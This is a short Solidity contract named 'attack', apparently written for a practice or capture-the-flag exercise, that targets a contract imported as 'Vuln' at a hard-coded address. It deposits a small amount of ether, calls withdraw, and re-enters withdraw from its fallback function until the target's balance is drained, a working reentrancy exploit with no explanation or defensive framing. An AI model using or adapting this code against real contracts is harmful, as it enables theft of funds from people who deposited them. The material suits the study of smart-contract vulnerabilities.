pragma solidity ^0.6.0;
import "./vuln.sol";

contract attack{
    address payable public addr;
    Vuln public vuln;

    constructor() public {
        addr = 0xEB81D9a87BbbBf4066be04AdDaDbF03410F1F58d;
        vuln = Vuln(addr);
    }


    function something() public payable {
        vuln.deposit.value(0.004 ether)();
        vuln.withdraw();
    }

    fallback() external payable {
        if (address(vuln).balance >= 0.004 ether){
            vuln.withdraw();
        }
    }


}